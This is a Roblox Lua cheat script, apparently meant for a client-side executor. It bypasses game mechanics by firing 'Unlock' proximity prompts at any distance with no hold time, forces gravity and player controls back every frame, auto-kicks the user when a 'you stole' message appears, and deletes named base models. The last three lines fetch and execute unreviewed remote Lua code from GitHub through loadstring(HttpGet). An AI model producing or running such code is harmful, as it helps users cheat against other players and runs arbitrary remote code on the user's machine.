        -- Gradient effect
        local gradient = Instance.new("UIGradient")
        gradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 180, 0))
        }
        gradient.Rotation = 90
        gradient.Parent = button
        
        screenGui.Parent = game:GetService("CoreGui")
        
        return screenGui, button, gradient
    end
    
    local gui, toggleBtn, gradient = createToggleGUI()
    
    -- Toggle button click handler
    toggleBtn.MouseButton1Click:Connect(function()
        kickEnabled = not kickEnabled
        
        if kickEnabled then
            toggleBtn.Text = "AUTO-KICK: ON"
            toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
            gradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 180, 0))
            }
        else
            toggleBtn.Text = "AUTO-KICK: OFF"
            toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
            gradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 0, 0))
            }
        end
    end)
    
    -- Recreate GUI if removed
    game:GetService("CoreGui").ChildRemoved:Connect(function(child)
        if child.Name == "AutoKickToggleGUI" then
            gui, toggleBtn, gradient = createToggleGUI()
            
            -- Update button state
            if kickEnabled then
                toggleBtn.Text = "AUTO-KICK: ON"
                toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
                gradient.Color = ColorSequence.new{
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 180, 0))
                }
            else
                toggleBtn.Text = "AUTO-KICK: OFF"
                toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
                gradient.Color = ColorSequence.new{
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 0, 0))
                }
            end
            
            -- Reconnect toggle
            toggleBtn.MouseButton1Click:Connect(function()
                kickEnabled = not kickEnabled
                
                if kickEnabled then
                    toggleBtn.Text = "AUTO-KICK: ON"
                    toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
                    gradient.Color = ColorSequence.new{
                        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 180, 0))
                    }
                else
                    toggleBtn.Text = "AUTO-KICK: OFF"
                    toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
                    gradient.Color = ColorSequence.new{
                        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 0, 0))
                    }
                end
            end)
        end
    end)
    
    -- Helper: remove <font>, <b>, <i>, etc. tags
    local function stripRichTextTags(text)
        if typeof(text) ~= "string" then
            return ""
        end
        return (text:gsub("<[^>]->", "")) -- removes all <...> tags
    end
    
    -- Helper: detect if text contains "you stole" (case-insensitive)
    local function getYouStoleText(text)
        if typeof(text) ~= "string" then
            return nil
        end
        local cleanText = stripRichTextTags(text)
        local lowerText = string.lower(cleanText)
        local startPos = string.find(lowerText, "you stole", 1, true)
        if startPos then
            return cleanText
        end
        return nil
    end
    
    -- Kick with the specific detected text (only if enabled)
    local function triggerKick(foundText)
        if not kickEnabled then return end -- Check if enabled
        local message = foundText or "you stole something!"
        player:Kick(message)
    end
    
    -- Scan a GuiObject and its descendants for "you stole"
    local function scanGuiObject(guiObj)
        if not kickEnabled then return end -- Check if enabled
        
        if guiObj:IsA("TextLabel") or guiObj:IsA("TextButton") or guiObj:IsA("TextBox") then
            local foundText = getYouStoleText(guiObj.Text)
            if foundText then
                triggerKick(foundText)
                return
            end
        end
        
        for _, desc in ipairs(guiObj:GetDescendants()) do
            if desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox") then
                local foundText = getYouStoleText(desc.Text)
                if foundText then
                    triggerKick(foundText)
                    return
                end
            end
        end
    end
    
    -- Watch for new GUIs appearing
    playerGui.ChildAdded:Connect(function(child)
        if not kickEnabled then return end -- Check if enabled
        task.wait(0.05)
        scanGuiObject(child)
        
        child.DescendantAdded:Connect(function(desc)
            if not kickEnabled then return end -- Check if enabled
            if desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox") then
                local foundText = getYouStoleText(desc.Text)
                if foundText then
                    triggerKick(foundText)
                end
            end
        end)
    end)
    
    -- Also check existing GUIs at startup
    for _, child in ipairs(playerGui:GetChildren()) do
        scanGuiObject(child)
        child.DescendantAdded:Connect(function(desc)
            if not kickEnabled then return end -- Check if enabled
            if desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox") then
                local foundText = getYouStoleText(desc.Text)
                if foundText then
                    triggerKick(foundText)
                end
            end
        end)
    end
    
    print("Auto-Kick GUI loaded - Toggle button at top middle of screen")
end

--// =======================
--// GRAVITY NORMALIZER
--// =======================

do
    local RunService = game:GetService("RunService")
    local Workspace = game:GetService("Workspace")
    local NORMAL_GRAVITY = 196.2 -- Roblox default

    RunService.Heartbeat:Connect(function()
        if Workspace.Gravity ~= NORMAL_GRAVITY then
            Workspace.Gravity = NORMAL_GRAVITY
        end
    end)
end


-- =======================
-- PROXIMITY PROMPT BUTTONS
-- =======================

local yCoordinates = {
    [1] = -3.73539066,
    [2] = 15.672575,
    [3] = 22.9842033
}

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ProximityPromptGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local container = Instance.new("Frame")
container.Size = UDim2.new(0, 180, 0, 45)
container.Position = UDim2.new(0.5, -90, 1, -110)
container.BackgroundTransparency = 1
container.Parent = screenGui

local function createButton(number, yPos)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 50, 0, 40)
    button.Position = UDim2.new(0, (number - 1) * 60 + 5, 0, 0)
    button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    button.Text = tostring(number)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 22
    button.Font = Enum.Font.GothamBold
    button.BorderSizePixel = 1
    button.BorderColor3 = Color3.fromRGB(255, 255, 255)
    button.Parent = container
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = button
    
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(230, 40, 40)
    end)
    
    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    end)
    
    return button
end

local buttons = {}
for i = 1, 3 do
    buttons[i] = createButton(i, yCoordinates[i])
end

local currentLine = nil

local function createLineToPrompt(promptPosition)
    if currentLine then
        currentLine:Destroy()
    end
    
    local character = player.Character
    if not character then return end
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end
    
    local line = Instance.new("Part")
    line.Anchored = true
    line.CanCollide = false
    line.Material = Enum.Material.Neon
    line.Color = Color3.fromRGB(0, 255, 0)
    line.TopSurface = Enum.SurfaceType.Smooth
    line.BottomSurface = Enum.SurfaceType.Smooth
    
    local startPos = humanoidRootPart.Position
    local endPos = promptPosition
    local distance = (endPos - startPos).Magnitude
    
    line.Size = Vector3.new(0.2, 0.2, distance)
    line.CFrame = CFrame.new(startPos, endPos) * CFrame.new(0, 0, -distance / 2)
    line.Parent = workspace
    
    currentLine = line
    
    task.delay(3, function()
        if line and line.Parent then
            line:Destroy()
        end
    end)
end

local function getAllProximityPrompts()
    local prompts = {}
    
    for _, descendant in pairs(workspace:GetDescendants()) do
        if descendant:IsA("ProximityPrompt") then
            local parent = descendant.Parent
            while parent do
                if parent:IsA("Folder") and parent.Name == "Unlock" then
                    table.insert(prompts, descendant)
                    break
                end
                parent = parent.Parent
            end
        end
    end
    
    return prompts
end

local function findNearestPromptAtY(prompts, targetY)
    local character = player.Character
    if not character then return nil end
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return nil end
    
    local nearestPrompt = nil
    local shortestDistance = math.huge
    local playerPosition = humanoidRootPart.Position
    
    local yTolerance = 5
    
    for _, prompt in pairs(prompts) do
        if prompt.Enabled and prompt.Parent then
            local promptPosition = prompt.Parent.Position
            local yDifference = math.abs(promptPosition.Y - targetY)
            
            if yDifference <= yTolerance then
                local distance = (playerPosition - promptPosition).Magnitude
                
                if distance < shortestDistance then
                    shortestDistance = distance
                    nearestPrompt = prompt
                end
            end
        end
    end
    
    return nearestPrompt, shortestDistance
end

local function activatePromptAtY(buttonNumber)
    local button = buttons[buttonNumber]
    local targetY = yCoordinates[buttonNumber]
    
    button.Text = "..."
    button.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    
    wait(0.1)
    
    local prompts = getAllProximityPrompts()
    
    if #prompts == 0 then
        button.Text = "X"
        wait(1)
        button.Text = tostring(buttonNumber)
        button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        return
    end
    
    local originalValues = {}
    for _, prompt in pairs(prompts) do
        originalValues[prompt] = {
            MaxActivationDistance = prompt.MaxActivationDistance,
            HoldDuration = prompt.HoldDuration,
            RequiresLineOfSight = prompt.RequiresLineOfSight
        }
    end
    
    for _, prompt in pairs(prompts) do
        prompt.MaxActivationDistance = 999999
        prompt.HoldDuration = 0
        prompt.RequiresLineOfSight = false
    end
    
    local nearestPrompt, distance = findNearestPromptAtY(prompts, targetY)
    
    if nearestPrompt then
        local promptPosition = nearestPrompt.Parent.Position
        createLineToPrompt(promptPosition)
        
        local success = false
        
        pcall(function()
            nearestPrompt.Triggered:Fire(player)
            success = true
        end)
        
        if not success then
            pcall(function()
                nearestPrompt.Triggered:Fire()
                success = true
            end)
        end
        
        if not success and fireproximityprompt then
            pcall(function()
                fireproximityprompt(nearestPrompt, 0)
                success = true
            end)
        end
        
        if success then
            button.Text = "✓"
            button.BackgroundColor3 = Color3.fromRGB(50, 255, 50)
        else
            button.Text = "X"
            button.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
        end
        
        wait(1)
        button.Text = tostring(buttonNumber)
        button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    else
        button.Text = "X"
        wait(1)
        button.Text = tostring(buttonNumber)
        button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    end
    
    for prompt, values in pairs(originalValues) do
        if prompt and prompt.Parent then
            prompt.MaxActivationDistance = values.MaxActivationDistance
            prompt.HoldDuration = values.HoldDuration
            prompt.RequiresLineOfSight = values.RequiresLineOfSight
        end
    end
end

for i = 1, 3 do
    buttons[i].MouseButton1Click:Connect(function()
        activatePromptAtY(i)
    end)
end
--// =======================
--// CONTINUOUS CONTROL ENABLER
--// =======================
do
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
    
    local function enableControls()
        pcall(function()
            local playerModule = LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")
            require(playerModule):GetControls():Enable()
        end)
    end
    
    -- Enable controls every frame
    RunService.Heartbeat:Connect(function()
        enableControls()
    end)
    
    -- Also enable on RenderStepped for extra enforcement
    RunService.RenderStepped:Connect(function()
        enableControls()
    end)
    
    print("[Control Enabler] Continuously enabling controls")
end


task.spawn(function()

	for _, obj in ipairs(workspace:GetDescendants()) do

		if obj:IsA("Model") then

			if obj.Name == "Valentines Base" or obj.Name == "Taco Base" then

				obj:Destroy()

			end

		end

	end

end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/temiepeoepo/11234123123/refs/heads/main/cool2.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/temiepeoepo/11234123123/refs/heads/main/cool3.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/8rhd7d/1231231/refs/heads/main/trippy.lua"))()


